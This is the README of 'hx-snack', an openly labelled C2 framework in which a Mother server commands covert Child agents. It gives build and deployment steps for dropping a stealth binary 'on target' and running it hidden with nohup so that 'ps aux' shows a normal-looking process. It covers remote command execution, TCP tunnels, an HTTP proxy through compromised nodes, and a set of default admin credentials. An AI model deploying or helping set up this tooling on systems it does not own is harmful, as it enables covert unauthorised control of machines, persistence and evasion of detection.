# hxの偷吃

Distributed C2 Framework — **Mother-Child WebSocket architecture** for monitoring, tunneling, and HTTP proxying across globally deployed nodes.

> *"One Mother, Infinite Children."*

## Architecture

```
           ┌─────────────────────────┐
           │       Mother Node        │
           │  (WebUI + API + WS Hub)  │
           └──────────┬──────────────┘
                      │ WebSocket (msgpack)
         ┌────────────┼────────────┐
    ┌────┴────┐  ┌────┴────┐  ┌────┴────┐
    │ Child A │  │ Child B │  │ Child C │  ...
    │ Tokyo   │  │ LA      │  │ HK      │
    └─────────┘  └─────────┘  └─────────┘
```

## Features

- **Real-time monitoring** — CPU, memory, disk, network from all children
- **Remote task execution** — Run commands on any child node
- **TCP tunnels** — Port forwarding through WebSocket (Mother port → Child internal service)
- **HTTP reverse proxy** — `/p/http[s]://target/path` transparently routes requests through children
- **Stealth mode** — Child runs with zero CLI args, zero env vars, xxxxxxxxd process name
- **Load balancing** — Multiple children per tunnel port, automatic round-robin
- **Auto-reconnect** — Exponential backoff on connection loss
- **WebUI** — Dark cinematic dashboard with live status

## Quick Start

### Mother (your main server)

```bash
./mother -port 8080 -key my-secret-key
```

Open `http://localhost:8080` for the WebUI.

Default admin credentials: `huanx` / `REDACTED1`

### Child (stealth deployment)

Edit `cmd/child/main.go` and set your Mother URL + key:

```go
const (
    motherURL = "ws://<YOUR_HOST>:10300/api/stream"
    motherKey = "<YOUR_KEY>"
)
```

Build:

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o child ./cmd/child/
```

Drop the binary on target and run:

```bash
nohup ./child > /dev/null 2>&1 &
```

That's it. Zero arguments, zero env vars, zero config files — `ps aux` shows a normal-looking process.

## HTTP Proxy via Children

Use the `/p/` prefix to route HTTP/HTTPS requests through child nodes:

```bash
# HTTPS (TLS handled automatically)
curl http://mother:8080/p/https://api.openai.com/v1/models \
  -H "Authorization: Bearer sk-xxx"

# HTTP
curl http://mother:8080/p/http://httpbin.org/get

# POST requests
curl -X POST http://mother:8080/p/https://api.example.com/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{"model":"gpt-4","messages":[{"role":"user","content":"hi"}]}'

# Shorthand (defaults to HTTP)
curl http://mother:8080/p/httpbin.org/get
```

Multiple children auto load-balance on round-robin.

## API

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/children` | GET | List all connected children |
| `/api/tasks` | POST/GET | Submit task / list results |
| `/api/tunnels` | POST/GET | Create/manage TCP tunnels |
| `/api/stats` | GET | System stats |
| `/api/events` | GET | SSE event stream |
| `/ws` | WS | Child connection (legacy) |
| `/api/stream` | WS | Child connection (stealth) |
| `/p/...` | ANY | HTTP proxy through children |

### Tunnel API

```bash
# Create tunnel (auto-adds all online children)
curl -X POST http://mother:8080/api/tunnels \
  -H "Content-Type: application/json" \
  -d '{"target":"example.com:80","listen_port":8081}'

# Or specify a single child
curl -X POST http://mother:8080/api/tunnels \
  -d '{"child_id":"<id>","target":"example.com:80","listen_port":8081}'
```

## Build from Source

```bash
git clone https://github.com/huanxherta/hx-snack
cd hx-snack
go build -o mother ./cmd/mother/
# Edit cmd/child/main.go constants first!
go build -o child ./cmd/child/
```

## License

GPL-3.0

## Author

huanxherta